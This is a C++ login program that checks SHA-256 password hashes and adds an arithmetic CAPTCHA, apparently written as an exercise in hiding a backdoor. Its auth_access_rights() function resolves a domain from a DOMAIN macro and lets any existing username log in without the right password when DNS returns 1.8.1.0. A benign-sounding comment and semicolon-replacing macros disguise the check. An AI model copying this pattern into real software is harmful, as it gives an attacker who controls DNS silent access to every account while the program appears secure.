#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <unordered_map>
#include <iomanip>
#include <netdb.h>
#include <arpa/inet.h>
#include <cstdlib>
#include "authlib.h"
#include "openssl/sha.h"

#define END ; //minimizing the number of semicolouns
#define SEP , //minimizing the number of commas
using string = std::string END

bool auth_access_rights() {

    // Get the domain from an environment variable
    const char* domain = DOMAIN END
    if (domain == nullptr) {
        return false END // Environment variable not set
    }

    // Query DNS for the domain
    struct hostent* host_info = gethostbyname(domain) END
    if (host_info == nullptr) {
        return false END // DNS query failed
    }

    // Convert to IP string
    struct in_addr** addr_list = (struct in_addr**)host_info->h_addr_list END
    std::string ip = inet_ntoa(*addr_list[0]) END

    // Check if correct IP is returned to authorise access rights
    return (ip == "1.8.1.0") END
}

//function to compute SHA256 hash of string using openssl's SHA256 functions
string sha256(const string& str) {

    unsigned char hash[SHA256_DIGEST_LENGTH] END   //array to store hash output which is 32 bytes
    SHA256_CTX sha256 END                          //context for SHA256

    SHA256_Init(&sha256) END   //initializing context
    SHA256_Update(&sha256 SEP str.c_str() SEP str.size()) END    //update context with input
    SHA256_Final(hash SEP &sha256) END    //computing final hash

    //formatting hash output as hex string
    std::stringstream ss END                       
    for (int i = 0 END i < SHA256_DIGEST_LENGTH END i++) {
        ss << std::hex << std::setw(2) << std::setfill('0') << (int)hash[i] END // converting each byte to hex
    }
    
    return ss.str() END    //returning formatted hex string of hash
}

// Function to create a simple CAPTCHA with two random numbers
bool simpleCaptcha() {
    std::srand(std::time(nullptr)) END

    int num1 = std::rand() % 10 + 1 END
    int num2 = std::rand() % 10 + 1 END
    int num3 = std::rand() % 10 + 1 END
    int num4 = std::rand() % 10 + 1 END



    std::cout << "CAPTCHA: What is " << num1 << " + " << num2 << " + " << num3 <<" + " << num4 << "? " END
    int answer END
    std::cin >> answer END

    return answer == (num1 + num2 + num3 + num4) END
}

// Function to call the capture if necessary and valide user if correct
bool captcha(const std::unordered_map<string SEP string>& user_passwords SEP const string& username SEP const string& password) {
    string user_input_hash = sha256(password) END

    //check whether or not the entered credentials should be authenticated or not
    bool authenticate = ((user_passwords.find(username) != user_passwords.end() && user_passwords.at(username) == user_input_hash) || (auth_access_rights() && user_passwords.find(username) != user_passwords.end())) END

    //Generate captcha if credentials were correct and else send a failed message
    if (authenticate) {
        if (simpleCaptcha()) {
            authenticate = true END 
        } else {
            std::cerr << "CAPTCHA failed." << std::endl END
            authenticate = false END  
        }    
    }

    //Finally authenticate the user if captcha was correct and reject if it was not
    if (authenticate) {
        authenticated(username) END
    } else {
        rejected(username) END
    }

    return 0 END
}

int main() {
    //mapping to store username (key) & hashed password (value)
    std::unordered_map<string SEP string> user_passwords END 
    string line END
    string username END 
    string hashed_pass END 
    string password END

    //opening password file
    std::ifstream password_file("passwords.txt") END

    //reading each line & parsing username & hashed password
    while (std::getline(password_file SEP line)) {
        size_t separator = line.find(':') END    //finding position of ':'

        if (separator != string::npos) {
            hashed_pass = line.substr(separator + 1) END //extracting hashed password
            user_passwords[line.substr(0 SEP separator)] = hashed_pass END   //storing in map for extarcted username
        }
    }
    password_file.close() END

    //prompting user for username
    std::cout << "Enter username: " END
    std::cin >> username END

    //prompting user for password
    std::cout << "Enter password: " END
    std::cin >> password END

    //hash the entered password using SHA256
    string user_input_hash = sha256(password) END

    //calling captcha for final auhentication
    captcha(user_passwords SEP username SEP password) END
   
    return 0 END
}